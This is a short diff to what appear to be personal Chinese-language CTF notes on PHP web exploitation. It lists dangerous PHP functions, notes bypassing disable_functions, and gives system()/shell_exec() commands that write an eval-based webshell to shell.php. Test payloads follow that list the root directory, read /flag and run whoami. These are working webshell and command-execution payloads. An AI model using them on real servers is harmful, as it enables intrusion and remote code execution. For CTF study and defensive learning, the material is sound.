@@ -50,15 +50,19 @@ proc_open
 pcntl_exec
 dl
 
-[[bypass disable functions被屏蔽的函数]]
+[[bypass disable function被屏蔽的函数]]
 
 注入webshell
 system('echo \'<?php eval($_POST["shell"]);?>\' > shell.php');
 shell_exec('echo "<?php eval(\$_POST[\'shell\']); ?>" > shell.php')
 
-测试：
+测试指令/shell 指令：
 shell=phpinfo();
 shell=echo 123;
 shell=system("ls /"); -> "bin dev etc flag home lib media mnt proc root run sbin srv sys tmp usr var"
 shell=system("cat /flag");
+system('whoami');
+tac /file
 
+shell指令bypass
+. filename  ==  source filename  执行文件
